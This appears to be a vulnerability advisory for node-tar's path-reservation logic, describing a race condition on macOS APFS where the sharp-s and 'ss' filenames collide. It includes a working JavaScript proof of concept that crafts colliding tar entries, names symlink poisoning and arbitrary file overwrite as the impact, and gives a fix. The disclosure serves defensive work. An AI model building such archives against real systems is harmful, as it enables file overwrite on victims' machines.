summary: "Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS\
  \ APFS\n**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions\
  \ on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability\
  \ exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions\
  \ in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems\
  \ (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths\
  \ (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's\
  \ internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions.\
  \ The library uses a `PathReservations` system to ensure that metadata checks and file operations\
  \ for the same path are serialized. This prevents race conditions where one entry might clobber\
  \ another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\n\
  reserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization\
  \ disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n         \
  \   join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n\
  \        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss,\
  \ but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" >\
  \ collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\\
  n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan\
  \ 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser\
  \  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\n\
  const tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst\
  \ { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\n\
  if (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\n\
  fs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target:\
  \ ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA\
  \ = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1\
  \ = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n\
  });\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n\
  \    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\n\
  stream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length\
  \ % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512\
  \ - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\
  \n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is\
  \ high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\
  \nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what\
  \ exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit\
  \ dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n\
  \        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n\
  \        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}...\
  \ (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length ===\
  \ 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir,\
  \ files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-]\
  \ No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition**\
  \ which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems\
  \ using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in\
  \ which `ß` and `ss` are different), conflicting paths do not have their order properly preserved\
  \ under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an\
  \ inode collision with `ss`)). This enables an attacker to circumvent internal parallelization\
  \ locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\
  \n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that\
  \ matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')`\
  \ and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically\
  \ using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink`\
  \ entries (as npm does) to defend against arbitrary file writes via this file system entry\
  \ name collision issue.\n\n---"
